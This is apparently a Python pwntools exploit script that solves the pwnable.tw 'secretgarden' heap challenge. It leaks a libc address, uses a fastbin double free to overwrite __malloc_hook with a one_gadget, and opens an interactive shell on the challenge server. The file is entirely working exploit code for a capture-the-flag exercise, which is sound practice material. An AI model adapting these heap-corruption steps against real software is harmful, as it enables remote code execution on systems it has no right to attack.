from pwn import *

local = False
elf = 'secretgarden'

if local:
    context.binary = './'+elf
    r = process("./"+elf,)
else:
    ip = "chall.pwnable.tw"
    port = 10203
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc_64.so.6')

def add( size , name ,color):
	r.recvuntil( 'choice :')
	r.sendline('1')
	r.recvuntil( 'name :')
	r.sendline( str(size) )
	r.recvuntil( 'flower :' )
	r.send(name)
	r.recvuntil('flower :')
	r.sendline(color)

def show( ):
	r.recvuntil( 'Your choice :')
	r.sendline('2')

def delete( index ):
	r.recvuntil( 'Your choice :')
	r.sendline('3')
	r.recvuntil( 'garden:')
	r.sendline( str(index) )

def delete_all():
	r.recvuntil( 'Your choice :')
	r.sendline('4')

add( 400 , 'a'  , 'a') # 0
add( 400 , 'a'  , 'a') # 1
delete( 0 )
add( 0x50 , 'a'  , 'a') # 2
show()
r.recvuntil('flower[2] :')
main_area = u64(r.recv(6) + '\0\0') - 65
l.address = main_area - l.sym.__malloc_hook - 0x10
success('main_area = %s',hex(main_area))
success('libc = %s',hex(l.address))
raw_input('aaa')
add( 0x60 , 'aaa'  , 'aaa') # 3
add( 0x60 , 'aaa'  , 'aaa') # 4

delete(3)
delete(4)
delete(3)

one_gadget = l.address + 0xef6c4
success('malloc_hook = %s',hex(l.sym.__malloc_hook))
success('one_gadget = %s',hex(one_gadget))
add( 0x60 , p64(l.sym.__malloc_hook - 0x20 - 3),'aaa' )
add( 0x60 , 'aaa', 'aaa')
add( 0x60 , 'aaa', 'aaa')
add( 0x60 ,'w'*0x13 + p64(one_gadget),'aaa')
delete(6)
delete(6)
r.interactive()